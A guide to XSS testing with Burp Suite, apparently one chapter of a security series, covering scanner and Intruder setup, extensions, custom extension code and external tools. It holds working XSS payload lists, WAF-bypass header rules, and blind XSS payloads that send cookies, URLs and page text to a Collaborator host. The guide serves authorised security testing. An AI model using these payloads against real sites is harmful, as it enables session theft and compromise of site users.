# 36 - Burp Suite Integration for XSS Testing

## Overview

Burp Suite is the industry-standard web application security testing platform. This document covers comprehensive Burp Suite integration for XSS testing, including Scanner configuration, Intruder fuzzing, Repeater workflows, essential extensions from the BApp Store, Collaborator for blind XSS, custom extension development, session handling macros, and integration with external XSS tools. Every configuration and workflow is designed for maximum XSS detection coverage.

**Sources:**
- https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss
- https://portswigger.net/burp/documentation/desktop/tools/dom-invader
- https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
- https://portswigger.net/bappstore/98275a25394a417c9480f58740c1d981
- https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
- https://github.com/PortSwigger/turbo-intruder
- https://github.com/PortSwigger/xss-validator
- https://github.com/snoopysecurity/awesome-burp-extensions
- https://github.com/rm-rf-tools/awesome-burp-extensions-2025
- https://www.hackingarticles.in/burp-suite-for-pentester-xss-validator/
- https://www.hackingarticles.in/burp-suite-for-pentester-burp-collaborator/
- https://infosecwriteups.com/js-link-finder-burp-suite-extension-guide-e4809a6da268
- https://notifybugme.medium.com/automating-reflected-xss-with-burp-suite-intruder-a39b2f060db7
- https://medium.com/@jr.mayank1999/exploiting-blind-xss-with-burp-collaborator-client-fec38b5fc5e
- https://www.darkrelay.com/post/fuzzing-with-intruder
- https://null-byte.wonderhowto.com/how-to/discover-xss-security-flaws-by-fuzzing-with-burp-suite-wfuzz-xsstrike-0189971/

---

## 1. Burp Scanner XSS Detection

### 1.1 Scanner Configuration for XSS

Burp Scanner automatically tests for reflected, stored, and DOM-based XSS. Configure it for maximum XSS coverage:

**Active Scanning Configuration**:
1. Navigate to **Dashboard > New scan > Scan configuration**
2. Under **Issues Reported**, ensure these are enabled:
   - Cross-site scripting (reflected)
   - Cross-site scripting (stored)
   - Cross-site scripting (DOM-based reflected)
   - Cross-site scripting (DOM-based stored)
   - Client-side template injection
   - JavaScript injection (reflected)
   - JavaScript injection (stored)

**Scan Speed vs. Thoroughness**:

| Setting | Speed | XSS Coverage | Best For |
|---------|-------|-------------|----------|
| Lightweight | Fast | Basic reflected XSS only | Quick recon |
| Normal | Medium | Reflected + some stored | Standard assessments |
| Thorough | Slow | Full reflected + stored + DOM | Comprehensive testing |
| Custom (max XSS) | Very slow | All XSS types + edge cases | Dedicated XSS assessment |

**Custom XSS-Focused Scan Configuration**:
```
Audit optimization: Normal
Report issues: Selected (XSS-related only)
Handling of insertion points:
  - URL parameter values: Enabled
  - Body parameter values: Enabled
  - Cookie values: Enabled
  - HTTP header values: Enabled
  - URL path folders: Enabled
  - URL path filenames: Enabled
  - Entire body (for JSON/XML): Enabled
JavaScript analysis:
  - Enable JavaScript analysis: Yes
  - Maximum time per page for JS analysis: 30 seconds
  - Enable DOM-based attack analysis: Yes
```

### 1.2 Active Scan Insertion Points for XSS

Configure which insertion points Burp Scanner should test:

| Insertion Point | XSS Relevance | Priority |
|----------------|---------------|----------|
| URL parameter values | High -- most common reflected XSS | P0 |
| Body parameter values | High -- form/API injection | P0 |
| Cookie values | Medium -- stored XSS via cookie | P2 |
| URL path folders | Medium -- path-based reflection | P2 |
| URL path filenames | Medium -- filename reflection | P2 |
| HTTP header values (Referer, UA) | Medium -- blind XSS | P1 |
| AMF parameter values | Low -- Flash-era | P3 |
| Entire body | High for JSON/XML APIs | P1 |
| Custom insertion points | Varies | Define per target |

**How to configure**: Settings > Scanning > Audit > Insertion point types

### 1.3 Scanner Limitations and Manual Follow-Up

Burp Scanner has known limitations for XSS:
- **DOM XSS**: Scanner may miss complex DOM flows; use DOM Invader for thorough DOM testing
- **Stored XSS**: Scanner tests input-to-output on same request; cross-page stored XSS requires manual testing
- **Blind XSS**: Scanner cannot detect XSS that triggers in admin panels; use Collaborator payloads
- **WAF-protected targets**: Scanner payloads are often signature-matched; manual bypass needed
- **Framework-specific**: Angular/React template injection requires framework-aware testing

---

## 2. Burp Intruder XSS Fuzzing

### 2.1 Payload Positions

For each suspected injection point, configure Intruder positions:

**Attack Types for XSS**:

| Attack Type | Use Case | Example |
|-------------|----------|---------|
| Sniper | Test one parameter with XSS payloads | `?q=PAYLOAD` |
| Battering Ram | Same payload in all positions simultaneously | CSRF bypass testing |
| Pitchfork | Different payload lists per position | Username + XSS in different fields |
| Cluster Bomb | All combinations (rarely needed for XSS) | Multi-parameter interaction |

**Recommended: Sniper mode** for most XSS fuzzing.

### 2.2 XSS Payload Lists

**Built-in Payload Lists**:
- Fuzzing > XSS: Basic XSS vectors
- Fuzzing > XSS polyglots: Multi-context payloads

**Recommended External Payload Lists**:
```
# SecLists XSS payloads
/usr/share/seclists/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt
/usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt
/usr/share/seclists/Fuzzing/XSS/XSS-RSNAKE.txt
/usr/share/seclists/Fuzzing/XSS-Fuzzing

# Custom compact list (top 50 XSS payloads for fast fuzzing)
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
";alert(1);//
';alert(1);//
</script><img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<math><mi//onclick=alert(1)>clickme
<a href=javascript:alert(1)>click
${alert(1)}
{{constructor.constructor('alert(1)')()}}
--><img src=x onerror=alert(1)>
```

### 2.3 Grep Match Rules for XSS

Configure Intruder to flag successful XSS injections:

**Settings > Grep - Match** (add these patterns):
```
alert(1)
alert(document.domain)
alert(document.cookie)
onerror=
onload=
onfocus=
onclick=
ontoggle=
onmouseover=
javascript:
<script>
<svg
<img src=x
```

**Settings > Grep - Extract**:
- Extract the HTML context around the reflection point to quickly identify injection context

**Settings > Grep - Payloads**:
- Enable "Flag results where payload was reflected in response" -- this is the most critical setting for XSS fuzzing

### 2.4 Intruder XSS Workflow

```
Step 1: Capture target request in Proxy
Step 2: Send to Intruder (Ctrl+I)
Step 3: Clear all positions, add position around suspected parameter value
Step 4: Select payload list (XSS-Cheat-Sheet-PortSwigger.txt recommended)
Step 5: Add Grep Match rules for XSS indicators
Step 6: Enable "Grep - Payloads" to flag reflections
Step 7: Launch attack
Step 8: Sort results by:
  - Grep match columns (indicates successful injection)
  - Response length (anomalies may indicate different behavior)
  - Status code (403 = WAF block, 500 = error-based info)
Step 9: Send interesting results to Repeater for manual verification
```

---

## 3. Burp Repeater XSS Testing Workflow

### 3.1 Manual Testing Process

```
Step 1: Send request with canary string: xss<>'"%;)(&#{} 
Step 2: Examine response to determine:
  - Where canary reflects (HTML body, attribute, JS, etc.)
  - Which characters survived unencoded
  - How many times canary appears (multiple reflection points)
  
Step 3: Based on context, craft appropriate payload
Step 4: Send payload and check:
  - Does payload appear intact in response?
  - Is it inside a context that would execute?
  - Are any characters stripped or encoded?
  
Step 5: If blocked, iterate with bypass techniques:
  - Try alternative tags/events
  - Try encoding variations
  - Check for filter gaps
  
Step 6: Render response in browser (right-click > Show response in browser)
  - This confirms actual execution in a real browser
  - Check for CSP blocking in browser console
```

### 3.2 Response Rendering

Burp's "Show response in browser" feature is critical for XSS verification:

1. In Repeater, right-click the response > **Show response in browser**
2. Copy the generated URL and open in Burp's embedded browser
3. Check if the XSS payload actually executes (alert fires, DOM modified)
4. Open DevTools to check for CSP violations or JavaScript errors
5. This catches false positives where payloads appear in source but do not execute

### 3.3 Repeater Tips for XSS

- **Use "Follow redirects"** to test XSS in redirect responses
- **Toggle "URL-encode as you type"** when manually typing payloads
- **Save XSS test requests** to Intruder for scaled testing
- **Use "Compare" feature** to diff responses with/without payload
- **Inspector tab** shows decoded parameter values -- useful for encoding debugging

---

## 4. Essential Burp Extensions for XSS

### 4.1 DOM Invader

**Purpose**: Browser-based DOM XSS detection using canary injection and source-to-sink tracing.

**Source**: Built into Burp Suite Professional (pre-installed in Burp's browser)

**Activation**:
1. Open Burp's embedded browser
2. Click the DOM Invader icon in the browser toolbar (or navigate to browser extensions)
3. Enable DOM Invader toggle
4. Set a canary string (default: auto-generated)

**Features**:
- Automatically injects canary into DOM sources (location.hash, location.search, document.referrer, postMessage, etc.)
- Shows sinks where canary appears with full data flow trace
- Tests prototype pollution vectors
- Tests web message (postMessage) handlers
- Augments Burp Scanner with browser-side detection

**Usage Workflow**:
```
1. Enable DOM Invader with canary
2. Browse the target application normally
3. DOM Invader tab shows detected DOM XSS flows:
   - Source: where user input enters (e.g., location.hash)
   - Sink: where it gets used dangerously (e.g., element.innerHTML)
   - Data flow: path from source to sink through JS code
4. Click "Exploit" to generate a PoC URL
5. Test PoC in browser to confirm execution
```

**postMessage Testing**:
```
1. Enable "Postmessage interception" in DOM Invader settings
2. Navigate to pages with cross-origin frames or window.postMessage usage
3. DOM Invader intercepts all postMessage calls
4. Edit message data to inject canary/payloads
5. Replay modified messages to test handler security
```

**Prototype Pollution**:
```
1. Enable "Prototype pollution" in DOM Invader settings
2. DOM Invader automatically tests for __proto__, constructor.prototype pollution
3. Shows exploitable gadgets if pollution is found
4. Identifies code paths that use polluted properties dangerously
```

### 4.2 Reflect

**Purpose**: Passively detect reflected parameters in real-time while browsing.

**Source**: BApp Store

**Installation**: Extensions > BApp Store > Search "Reflect" > Install

**How it works**:
- Monitors proxy traffic passively
- For each request parameter, checks if its value appears in the response
- Flags reflected parameters with context information
- No active requests -- purely passive analysis

**XSS Workflow**:
```
1. Install Reflect extension
2. Browse the target application normally through Burp proxy
3. Check Target tab > Reflect column for reflected parameters
4. Prioritize parameters where:
   - Value reflected in HTML body (highest priority)
   - Value reflected in JavaScript context
   - Value reflected in HTML attributes
5. Send reflected parameters to Repeater for manual XSS testing
```

### 4.3 XSS Validator

**Purpose**: Automated verification of XSS findings using a headless browser.

**Source**: https://github.com/PortSwigger/xss-validator | BApp Store

**Setup**:
```bash
# Install PhantomJS server (validation engine)
# Note: PhantomJS is deprecated; modern setups use Playwright/Puppeteer
git clone https://github.com/PortSwigger/xss-validator.git
cd xss-validator/xss-detector
phantomjs xss.js &
# Server runs on localhost:8093 by default
```

**Burp Configuration**:
1. Install XSS Validator from BApp Store
2. In Intruder, add the XSS Validator payload processor
3. Configure server URL (default: http://localhost:8093)
4. Add Grep Match rule for the XSS Validator response marker
5. Launch Intruder attack -- XSS Validator confirms which payloads actually execute

**Benefit**: Eliminates false positives by verifying execution in a real browser engine.

### 4.4 Backslash Powered Scanner

**Purpose**: Discovers unknown injection vulnerabilities through novel fuzzing techniques.

**Source**: BApp Store | https://github.com/PortSwigger/backslash-powered-scanner

**Features**:
- Tests for server-side template injection (SSTI) which can overlap with XSS
- Identifies unusual input handling behaviors
- Discovers injection points missed by standard scanners
- Detects expression language injection in Java frameworks

**Usage**: Runs automatically as a passive/active scan extension. No special configuration needed.

### 4.5 ParamMiner

**Purpose**: Discover hidden parameters and headers that may be injectable.

**Source**: BApp Store | https://github.com/PortSwigger/param-miner

**XSS Relevance**:
- Finds hidden GET/POST parameters not visible in the UI
- Discovers custom headers that reflect in responses
- Identifies cache poisoning parameters (XSS via cache)

**Usage**:
```
1. Right-click request > Extensions > Param Miner > Guess params
2. Select parameter types to guess:
   - GET parameters
   - POST parameters
   - Headers
   - Cookie values
3. ParamMiner tests thousands of common parameter names
4. Results appear in Burp's Issues tab
5. Test discovered parameters for XSS reflection
```

### 4.6 JS Link Finder

**Purpose**: Passively extract endpoints and links from JavaScript files.

**Source**: BApp Store | https://portswigger.net/bappstore/0e61c786db0c4ac787a08c4516d52ccf

**XSS Relevance**:
- Discovers hidden API endpoints that may have XSS vulnerabilities
- Finds JavaScript file references for DOM XSS source analysis
- Extracts URL patterns from minified/bundled JS

**Usage**:
```
1. Install from BApp Store
2. Browse target through Burp proxy
3. Check Target > Site map > JS files
4. JS Link Finder adds extracted URLs to site map
5. Test discovered endpoints for parameter reflection and XSS
```

**Source:** https://infosecwriteups.com/js-link-finder-burp-suite-extension-guide-e4809a6da268

### 4.7 Additional XSS Extensions

| Extension | Purpose | BApp Store |
|-----------|---------|------------|
| **Reflected Parameters** | Highlights reflected params in Proxy history | Yes |
| **DOM XSS Checks** | Passive scanner for DOM-based XSS patterns | Yes |
| **Active Scan++** | Enhanced active scanner with additional XSS checks | Yes |
| **BurpBounty** | Custom scan profiles including XSS-specific profiles | Yes |
| **Hackvertor** | Tag-based encoding/decoding for payload crafting | Yes |
| **CSP Auditor** | Analyzes Content Security Policy for XSS-relevant weaknesses | Yes |
| **Turbo Intruder** | High-speed payload delivery for mass XSS testing | Yes |
| **HTTP Request Smuggler** | Detects request smuggling for XSS delivery | Yes |
| **HUNT** | Identifies common XSS-vulnerable parameter names | Yes |
| **AutoRepeater** | Automatically retests requests with modified parameters | Yes |

---

## 5. Burp Collaborator for Blind XSS

### 5.1 Generating Collaborator Payloads

Burp Collaborator provides out-of-band interaction detection, critical for blind XSS where the payload executes in a context you cannot observe (admin panels, logging dashboards, support ticket systems).

**Generate Collaborator Payload**:
1. Burp Suite > Burp menu > Burp Collaborator client
2. Click "Copy to clipboard" to get a unique Collaborator URL
3. Payload format: `PAYLOAD.burpcollaborator.net`

**Blind XSS Payloads with Collaborator**:
```html
<!-- Basic blind XSS with Collaborator -->
"><img src=x onerror="new Image().src='https://COLLAB_ID.burpcollaborator.net/xss?c='+document.cookie">

<!-- Script-based blind XSS -->
"><script src=https://COLLAB_ID.burpcollaborator.net/xss.js></script>

<!-- Fetch-based blind XSS -->
"><img src=x onerror="fetch('https://COLLAB_ID.burpcollaborator.net/xss',{method:'POST',mode:'no-cors',body:document.cookie})">

<!-- Data exfiltration via Collaborator -->
"><img src=x onerror="fetch('https://COLLAB_ID.burpcollaborator.net/data',{method:'POST',mode:'no-cors',body:JSON.stringify({cookie:document.cookie,url:location.href,dom:document.body.textContent.substring(0,500)})})">
```

### 5.2 Monitoring Collaborator Interactions

```
1. Keep Collaborator client open during testing
2. Click "Poll now" periodically (or enable auto-poll)
3. Watch for:
   - DNS interactions: Payload was loaded (domain resolved)
   - HTTP interactions: Payload executed (request made to Collaborator)
   - HTTPS interactions: Payload executed with TLS
4. Interaction details show:
   - Source IP (admin panel IP)
   - Timestamp
   - Request headers (may include cookies, auth tokens)
   - Request body (if POST-based exfiltration used)
```

### 5.3 Blind XSS Deployment Strategy

Deploy Collaborator-based blind XSS payloads to every input that may be consumed by admin/internal systems:

| Input Surface | Payload Location | Priority |
|--------------|-----------------|----------|
| Contact form name/email/message | All fields | High |
| Support ticket title/body | All fields | High |
| User registration display name | Display name field | Medium |
| User-Agent header | Custom header | Medium |
| Referer header | Custom header | Medium |
| File upload filename | Filename field | Medium |
| API error parameters | Query strings | Low |
| Feedback/survey forms | All text fields | High |

---

## 6. Custom Burp Extensions for XSS

### 6.1 Python Extension: Auto-XSS Canary Injector

```python
# auto_xss_canary.py - Automatically injects XSS canary into all parameters
from burp import IBurpExtender, IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    CANARY = "xss<>'\"%(){};"
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Auto XSS Canary")
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            # Check response for canary reflection
            response = messageInfo.getResponse()
            if response:
                responseStr = self._helpers.bytesToString(response)
                if self.CANARY in responseStr:
                    # Highlight reflected requests
                    messageInfo.setHighlight("red")
                    # Log finding
                    url = self._helpers.analyzeRequest(messageInfo).getUrl()
                    self._callbacks.issueAlert(
                        "XSS Canary reflected at: " + str(url)
                    )
```

### 6.2 Python Extension: CSP Header Analyzer

```python
# csp_analyzer.py - Analyzes CSP headers for XSS bypass opportunities
from burp import IBurpExtender, IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    UNSAFE_DIRECTIVES = ['unsafe-inline', 'unsafe-eval', 'data:', '*']
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("CSP XSS Analyzer")
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            return
        response = messageInfo.getResponse()
        if not response:
            return
        responseInfo = self._helpers.analyzeResponse(response)
        for header in responseInfo.getHeaders():
            if header.lower().startswith('content-security-policy:'):
                csp = header.split(':', 1)[1].strip()
                issues = self.analyze_csp(csp)
                if issues:
                    url = self._helpers.analyzeRequest(messageInfo).getUrl()
                    self._callbacks.issueAlert(
                        "CSP weakness at %s: %s" % (url, '; '.join(issues))
                    )
    
    def analyze_csp(self, csp):
        issues = []
        if 'script-src' not in csp and 'default-src' not in csp:
            issues.append("No script-src or default-src (XSS unrestricted)")
        for directive in self.UNSAFE_DIRECTIVES:
            if directive in csp:
                issues.append("Contains '%s'" % directive)
        if 'report-only' in csp.lower():
            issues.append("Report-Only mode (not enforced)")
        return issues
```

### 6.3 Java Extension Skeleton

```java
// XSSHelper.java - Template for custom Burp XSS extension
package burp;

import java.util.List;

public class XSSHelper implements IBurpExtender, IScannerCheck {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("XSS Helper");
        callbacks.registerScannerCheck(this);
    }
    
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        // Analyze response for XSS indicators
        byte[] response = baseRequestResponse.getResponse();
        String responseStr = helpers.bytesToString(response);
        // Check for dangerous sinks in JavaScript
        // Check for unencoded user input reflection
        // Return issues if found
        return null;
    }
    
    @Override
    public List<IScanIssue> doActiveScan(
            IHttpRequestResponse baseRequestResponse,
            IScannerInsertionPoint insertionPoint) {
        // Insert XSS payloads and check for reflection/execution
        return null;
    }
    
    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return existingIssue.getIssueName().equals(newIssue.getIssueName()) ? -1 : 0;
    }
}
```

---

## 7. Burp Session Handling for Authenticated XSS Testing

### 7.1 Macro-Based CSRF Token Handling

Many applications require CSRF tokens for state-changing requests. Burp macros automatically extract fresh tokens.

**Setup**:
```
1. Settings > Sessions > Session handling rules > Add
2. Rule Actions > Add > Run a macro
3. Define macro:
   a. Select the request that returns a CSRF token (e.g., GET /settings)
   b. Configure "Custom parameter locations in response":
      - Parameter name: csrf_token
      - Extract from: Response body
      - Regex/start-end markers to locate token value
4. After running macro:
   - "Update current request with parameters matched from final macro response"
   - Select csrf_token parameter to update
5. Scope: Apply to target URLs in scope
6. Tools scope: Scanner, Intruder, Repeater
```

### 7.2 Session Validation and Re-Authentication

Keep sessions alive during long XSS fuzzing runs:

```
1. Settings > Sessions > Session handling rules > Add
2. Rule Actions > Add > Check session is valid
3. Configure validation:
   - Issue current request
   - Inspect response for: redirect to login page, "session expired" text
4. If session is invalid:
   - Run a macro to re-authenticate
   - Macro steps: GET /login > POST /login with credentials
5. Update current request with new session cookies
```

### 7.3 Cookie Jar Management

```
1. Settings > Sessions > Cookie jar
2. Ensure Burp's cookie jar is enabled for:
   - Proxy (captures cookies from browsing)
   - Scanner (uses cookies for authenticated scanning)
   - Intruder (uses cookies for authenticated fuzzing)
   - Repeater (uses cookies for manual testing)
3. Monitor cookie jar for session expiry
4. Manually add cookies if needed (e.g., from auth-agent)
```

---

## 8. Burp Match/Replace Rules for XSS Bypass

### 8.1 WAF Bypass Rules

Configure match/replace rules to automatically modify requests for WAF bypass:

**Settings > Proxy > Match and replace**:

| Match (Request Header/Body) | Replace | Purpose |
|-----------------------------|---------|---------|
| `Content-Type: application/x-www-form-urlencoded` | `Content-Type: multipart/form-data; boundary=----` | Content-Type confusion bypass |
| (empty) | `X-Forwarded-For: 127.0.0.1` (add header) | IP-based WAF bypass |
| (empty) | `X-Originating-IP: 127.0.0.1` (add header) | IP whitelist bypass |
| `<script>` | `<SCRIPT>` | Case variation bypass |
| `alert(1)` | `confirm(1)` | Keyword bypass |

### 8.2 Encoding Rules

| Match | Replace | Purpose |
|-------|---------|---------|
| `<` | `%3C` | URL encode angle brackets |
| `>` | `%3E` | URL encode angle brackets |
| `<script>` | `%253Cscript%253E` | Double URL encode |

### 8.3 Auto-Inject Blind XSS

Add match/replace rules to automatically inject blind XSS canaries:

| Scope | Match | Replace | Purpose |
|-------|-------|---------|---------|
| Request header | `User-Agent: (.*)` | `User-Agent: $1 <script src=//COLLAB.burpcollaborator.net>` | Blind XSS via UA |
| Request header | `Referer: (.*)` | `Referer: $1"><script src=//COLLAB.burpcollaborator.net></script>` | Blind XSS via Referer |

---

## 9. Turbo Intruder for Mass XSS Testing

### 9.1 Overview

Turbo Intruder is a Burp extension that sends large numbers of HTTP requests using an asynchronous I/O engine, far exceeding standard Intruder's speed.

**Source**: https://github.com/PortSwigger/turbo-intruder | BApp Store

### 9.2 XSS Fuzzing Script

```python
# turbo_xss_fuzz.py - Mass XSS parameter fuzzing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=True)
    
    # Load XSS payloads
    for payload in open('/usr/share/seclists/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt'):
        payload = payload.strip()
        if payload:
            engine.queue(target.req, payload.encode())

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
    # Flag responses that contain our payload unencoded
    if req.response and b'alert(' in req.response:
        table.add(req)
```

### 9.3 Mass Parameter XSS Discovery

```python
# turbo_mass_params.py - Test XSS across many URLs and parameters
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=50,
                          pipeline=False)
    
    payloads = ['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
                '"><img src=x onerror=alert(1)>', "'-alert(1)-'"]
    
    for payload in payloads:
        engine.queue(target.req, payload.encode())

def handleResponse(req, interesting):
    # Check for reflection without encoding
    if b'onerror=alert(1)' in req.response or b'onload=alert(1)' in req.response:
        table.add(req)
```

### 9.4 Turbo Intruder vs Standard Intruder

| Feature | Standard Intruder | Turbo Intruder |
|---------|------------------|----------------|
| Speed | ~200 req/s (Pro) | 1000-30000+ req/s |
| Scripting | GUI-based | Python scripts |
| Pipeline | Limited | Full HTTP pipelining |
| Concurrency | Thread-based | Async I/O |
| Use case | Standard fuzzing | Mass testing, large payload lists |
| Learning curve | Easy | Moderate (Python required) |

---

## 10. Integration with External XSS Tools

### 10.1 Burp + Dalfox Integration

```bash
# Export Burp sitemap URLs, then scan with Dalfox
# Step 1: Export URLs from Burp (Target > Site map > right-click > Copy URLs)
# Step 2: Feed to Dalfox with Burp proxy

dalfox file burp_urls.txt \
  --proxy http://127.0.0.1:8080 \
  --custom-payload xss_payloads.txt \
  --deep-domxss \
  --blind "COLLAB_ID.burpcollaborator.net" \
  -o dalfox_results.json --format json
```

### 10.2 Burp + kxss Integration

```bash
# kxss checks which characters reflect unfiltered
# Export URLs from Burp and pipe through kxss

cat burp_urls.txt | kxss | tee kxss_results.txt
# Review results for unfiltered < > " ' characters
# Send confirmed reflections back to Burp Repeater for manual testing
```

### 10.3 Burp + XSStrike Integration

```bash
# XSStrike with Burp proxy for traffic capture
python3 xsstrike.py -u "https://target.com/search?q=test" \
  --proxy http://127.0.0.1:8080

# All XSStrike requests are captured in Burp Proxy history
# Useful for: reviewing WAF bypass attempts, replaying in Repeater
```

### 10.4 Proxy Chain Configuration

For all external tools, proxy through Burp to capture traffic:

```bash
# Set HTTP_PROXY for command-line tools
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# Or per-tool proxy flags:
dalfox url "https://target.com/?q=test" --proxy http://127.0.0.1:8080
nuclei -u https://target.com -proxy http://127.0.0.1:8080
```

---

## 11. Complete XSS Testing Workflow with Burp

```
Phase 1: Setup
  [ ] Configure Burp project with target scope
  [ ] Install extensions: DOM Invader, Reflect, ParamMiner, JS Link Finder, Hackvertor
  [ ] Configure session handling rules for authenticated testing
  [ ] Set up Collaborator client for blind XSS

Phase 2: Passive Discovery
  [ ] Browse target application through Burp proxy
  [ ] Review Reflect extension for reflected parameters
  [ ] Check JS Link Finder for hidden endpoints
  [ ] Run ParamMiner on key pages for hidden parameters
  [ ] Enable DOM Invader and browse for DOM XSS

Phase 3: Active Scanning
  [ ] Run active scan on in-scope URLs with XSS-focused configuration
  [ ] Review Scanner findings for XSS issues
  [ ] Note false positives for manual verification

Phase 4: Manual Testing (Repeater)
  [ ] Test each reflected parameter from Phase 2
  [ ] Inject canary, analyze context, craft payload
  [ ] Verify execution via "Show response in browser"
  [ ] Test bypass techniques for filtered inputs

Phase 5: Automated Fuzzing (Intruder/Turbo Intruder)
  [ ] Fuzz confirmed reflection points with XSS payload lists
  [ ] Use Grep Match rules to identify successful injections
  [ ] Send Intruder results to Repeater for verification

Phase 6: Blind XSS Deployment
  [ ] Deploy Collaborator payloads to all admin-consumed inputs
  [ ] Monitor Collaborator for interactions
  [ ] Investigate any callbacks for full exploitation

Phase 7: External Tool Integration
  [ ] Run Dalfox on exported URLs through Burp proxy
  [ ] Feed kxss reflection results back into Burp
  [ ] Use XSStrike for WAF bypass testing

Phase 8: Documentation
  [ ] Log all confirmed XSS findings
  [ ] Capture screenshots/evidence
  [ ] Generate report from Burp Scanner issues
```

---

## Key Takeaways

1. **Layer your testing**: Combine Scanner (automated) + Repeater (manual) + Intruder (fuzzing) + DOM Invader (DOM XSS) for comprehensive coverage.
2. **Extensions multiply effectiveness**: DOM Invader, Reflect, ParamMiner, and JS Link Finder each catch XSS that others miss.
3. **Collaborator is essential for blind XSS**: Deploy Collaborator payloads to every admin-facing input on every engagement.
4. **Session handling prevents stale sessions**: Configure macros to keep authentication valid during long fuzzing runs.
5. **Proxy external tools through Burp**: Capture all traffic in one place for review and replay.
6. **Turbo Intruder for scale**: When you need to test thousands of URLs or payloads, Turbo Intruder is orders of magnitude faster than standard Intruder.
